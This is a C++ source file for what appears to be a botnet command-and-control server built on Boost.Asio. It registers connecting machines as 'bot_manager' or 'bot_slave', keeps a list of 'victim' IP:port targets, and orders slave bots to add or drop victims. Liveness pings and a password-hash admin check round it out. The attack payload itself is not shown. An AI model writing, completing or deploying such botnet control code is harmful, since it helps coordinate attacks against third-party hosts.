#include "server.h"

#include <string>

server::server(io::io_context& io_context, std::uint16_t port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      interval_(INACTIVITY_TIMEOUT),
      timer_(io_context_, interval_) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&server::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS_DATA]", boost::bind(&server::handleGetClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	    {"[GET_VICTIMS_DATA]", boost::bind(&server::handleGetVictimsData, this, boost::placeholders::_1,
					       boost::placeholders::_2, boost::placeholders::_3)},
	    {"[DEL_BOT]", boost::bind(&server::handleRemoveClient, this, boost::placeholders::_1, boost::placeholders::_2,
				      boost::placeholders::_3)},
	    {"[ADD_VICTIM]", boost::bind(&server::handleAddVictim, this, boost::placeholders::_1, boost::placeholders::_2,
					 boost::placeholders::_3)},
	    {"[DEL_VICTIM]", boost::bind(&server::handleRemoveVictim, this, boost::placeholders::_1, boost::placeholders::_2,
					 boost::placeholders::_3)},
	};
}

void server::start() {
	timer_.async_wait(boost::bind(&server::pingClients, this));
	accept();
}

void server::accept() {
	socket_.emplace(io_context_);
	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
}

void server::onAccept(err error_code) {
	size_t client_id = getClientId_();
	clients_sessions_container_.insert(
	    std::make_pair(client_id, std::unique_ptr<session>(new session(std::move(*socket_), io_context_, client_id))));
	auto& client = clients_sessions_container_.find(client_id)->second;

	PRINT("New client connected", "");

	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	accept();
}

void server::handleResponse(std::string& query, session* client) {
	PRINT(client->endpoint_, (": " + query));

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		PRINT("Invalid message", "");
		return;
	}
	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) {
		PRINT("No handler for ", parsed_msg["command"][0]);
		return;
	};
	updateMsgCounter_(client);
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
}

void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!isNumber_(params[0])) return;
	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
}

void server::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size()) {
		if (!checkHash_(params[0])) {
			std::hash<std::string> hasher;
			admin_hash_ = hasher(params[0]);
			PRINT(command, " was successfull!");
		}
	}

	if (clients_data_container_.find(client->ip_) != clients_data_container_.end()) {
		clients_data_container_[client->ip_].id = clients_sessions_container_.find(client->id_)->first;
		clients_data_container_[client->ip_].connected = getCurrentDateTime_();

		if (params.size() && checkHash_(params[0])) {
			clients_data_container_[client->ip_].status = "bot_manager";
		} else {
			clients_data_container_[client->ip_].status = "bot_slave";
		}
	}

	std::vector<std::string> output_params = {"1"};
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::handleGetClientsData(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.empty()) return;
	if (!checkHash_(params[0])) return;

	int bot_counter = 0;
	int max_bot_num_per_msg = 2;
	int current_msg = 0;

	std::vector<std::string> msg;
	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};
	std::vector<std::vector<std::string>> output_data;

	{
		std::unique_lock<std::mutex> lock(clients_data_m_);

		int msgs_to_transfer = ceil((float)clients_data_container_.size() / max_bot_num_per_msg);

		for (auto& bot : clients_data_container_) {
			if (bot_counter >= max_bot_num_per_msg || !bot_counter) {
				if (bot_counter) {
					output_data.emplace_back(std::move(msg));
					msg.clear();
				}
				bot_counter = 0;

				msg.push_back(std::to_string(current_msg + 1));
				msg.push_back(std::to_string(msgs_to_transfer));
				msg.push_back(std::to_string(parameters.size()));

				msg.insert(msg.end(), parameters.begin(), parameters.end());

				++current_msg;
			}

			msg.push_back(bot.first);
			msg.push_back(bot.second.connected);
			msg.push_back(std::to_string(bot.second.msgs_from));
			msg.push_back(std::to_string(bot.second.victims));
			msg.push_back(bot.second.status);

			++bot_counter;
		}
		output_data.emplace_back(std::move(msg));
	}

	for (auto& item : output_data) {
		std::cout << msg_parser_.genCommand(command, item) << std::endl;
		client->send(msg_parser_.genCommand(command, item));
	}
}

void server::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!checkHash_(params[0])) return;

	std::vector<std::string> output_params = {"1", "1", "1", "[Active_Victims]"};

	for (auto& victim : victims_ips_) {
		PRINT("VICTIMS: ", victim);
		output_params.push_back(victim);
	}
	PRINT("SENT: ", msg_parser_.genCommand(command, output_params));
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::handleRemoveClient(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	auto ip = params[1];
	auto id = clients_data_container_.find(client->ip_)->second.id;

	PRINT("REMOVING CLIENT: ", ip);
	{
		std::unique_lock<std::mutex> lock(clients_session_m_);
		if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
			// TODO:@mark fix bug when removing bot from hashmap
			// clients_sessions_container_.erase(id);
		}
	}
	{
		std::unique_lock<std::mutex> lock(clients_data_m_);
		if (clients_data_container_.find(ip) != clients_data_container_.end()) {
			// TODO:@mark fix same bug possibly
			// clients_data_container_.erase(ip);
		}
	}
}

void server::handleRemoveVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	auto victim = params[1];
	PRINT("REMOVING VICTIM: ", victim);

	if (!std::count(victims_ips_.begin(), victims_ips_.end(), victim)) {
		return;
	}

	size_t client_id_for_min_victims = -1;
	std::string client_ip = "";

	for (const auto& cl : clients_data_container_) {
		if (cl.second.status == "bot_slave" && std::find(cl.second.victims_vector.begin(), cl.second.victims_vector.end(),
								 victim) != cl.second.victims_vector.end()) {
			client_id_for_min_victims = cl.second.id;
			client_ip = cl.first;

			std::vector<std::string> output_params = {victim};
			std::string comm = "[REMOVE_CLIENT_VICTIM]";
			auto client_id_for_min_victims_session =
			    clients_sessions_container_.find(client_id_for_min_victims)->second;
			client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));

			// Update victim info
			clients_data_container_.find(client_ip)->second.victims--;

			victims_ips_.erase(std::remove(victims_ips_.begin(), victims_ips_.end(), victim), victims_ips_.end());
		}
	}

	clients_data_container_.find(client_ip)->second.victims_vector.erase(
	    std::remove(clients_data_container_.find(client_ip)->second.victims_vector.begin(),
			clients_data_container_.find(client_ip)->second.victims_vector.end(), victim),
	    clients_data_container_.find(client_ip)->second.victims_vector.end());
}

void server::handleAddVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	std::string victim_ip = params[1];

	PRINT("ADDING NEW VICTIM: ", victim_ip);

	if (validate_ip(victim_ip)) {
		size_t client_id_for_min_victims = -1;
		std::string client_ip = "";

		for (const auto& cl : clients_data_container_) {
			if (cl.second.status == "bot_slave") {
				client_id_for_min_victims = cl.second.id;
				client_ip = cl.first;

				std::vector<std::string> output_params = {victim_ip};
				std::string comm = "[ADD_CLIENT_VICTIM]";
				auto client_id_for_min_victims_session =
				    clients_sessions_container_.find(client_id_for_min_victims)->second;
				client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));

				// Update victim info
				clients_data_container_.find(client_ip)->second.victims++;
				clients_data_container_.find(client_ip)->second.victims_vector.push_back(victim_ip);
			}
		}
		victims_ips_.push_back(victim_ip);

	} else {
		PRINT("WRONG VICTIM IP: ", victim_ip);
	}
}

void server::pingClients() {
	std::string command = "[ARE_YOU_ALIVE]";
	std::vector<std::pair<size_t, std::string>> inactive_clients;
	{
		std::unique_lock<std::mutex> lock_s(clients_session_m_);
		std::unique_lock<std::mutex> lock_d(clients_data_m_);
		for (auto& client : clients_sessions_container_) {
			++client.second->inactive_timeout_count_;
			if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
				PRINT("Disconnecting due to inactivity client:", client.second->ip_);
				inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
			} else {
				if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
					continue;
				}
				std::vector<std::string> output_params = {NONE_PARAMETERS};
				client.second->send(msg_parser_.genCommand(command, output_params));
			}
		}
	}

	for (auto& client : inactive_clients) {
		{
			std::unique_lock<std::mutex> lock(clients_session_m_);
			clients_sessions_container_.erase(client.first);
		}
		{
			std::unique_lock<std::mutex> lock(clients_data_m_);
			if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
				clients_data_container_.erase(client.second);
			}
		}
	}
	timer_.expires_at(timer_.expires_at() + interval_);
	timer_.async_wait(boost::bind(&server::pingClients, this));
}

size_t server::getClientId_() {
	std::hash<long int> hasher;
	size_t id = hasher(
	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
	return id;
}

bool server::checkHash_(std::string& pass) {
	if (pass == "") return false;
	std::hash<std::string> hasher;
	return hasher(pass) == admin_hash_;
}

const std::string server::getCurrentDateTime_() {
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	tstruct = *localtime(&now);
	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
	return buf;
}

void server::updateMsgCounter_(session* client) {
	std::unique_lock<std::mutex> lock(clients_data_m_);
	++clients_data_container_[client->ip_].msgs_from;
}

bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }

bool server::validate_ip(std::string ip_string) {
	try {
		std::vector<std::string> victim_ip_port_split;
		boost::split(victim_ip_port_split, ip_string, boost::is_any_of(":"), boost::token_compress_on);
		std::vector<std::string> ip_tokens;
		boost::split(ip_tokens, victim_ip_port_split[0], boost::is_any_of("."), boost::token_compress_on);

		if (victim_ip_port_split[1].size() == 0 || stoi(victim_ip_port_split[1]) < 0 ||
		    stoi(victim_ip_port_split[1]) > 65536) {
			return false;
		}

		if (ip_tokens.size() != 4) {
			return false;
		}

		for (std::string token : ip_tokens) {
			if (token.size() > 3) {
				return false;
			}
			if (!isNumber_(token) || stoi(token) > 255 || stoi(token) < 0) {
				return false;
			}
		}
	} catch (err) {
		return false;
	}

	return true;
}
